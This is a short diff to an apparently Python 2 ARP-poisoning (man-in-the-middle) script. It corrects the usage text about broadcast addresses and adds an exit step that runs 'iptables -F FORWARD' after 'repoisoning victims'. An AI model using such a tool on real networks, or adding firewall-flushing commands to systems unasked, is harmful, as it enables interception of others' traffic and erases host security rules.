@@ -50,7 +50,7 @@ def arpp(target, victim,mode):
 #### Explicit Main =] ####
 
 if len(sys.argv) < 3 or os.geteuid() != 0:
-	print "[*] Usage:", sys.argv[0] ," victim_ip[can be broadcast addr]  target_ip [iface (default eth0)]"
+	print "[*] Usage:", sys.argv[0] ," victim_ip[cannot be broadcast addr]  target_ip [iface (default eth0)]"
 	print "[!] Make sure you're *root*!\n"
 	sys.exit(0)
 else:
@@ -81,7 +81,9 @@ except:
 	pass
 finally:
 	print "[*] Repoisoning victims"
-	arpp(server,client,2) 
+	arpp(server,client,2)
+	print "[*] Cleaning your iptables FORWARD rules!!"
+	os.system("iptables -F FORWARD")
 	sys.exit(0)
 
 
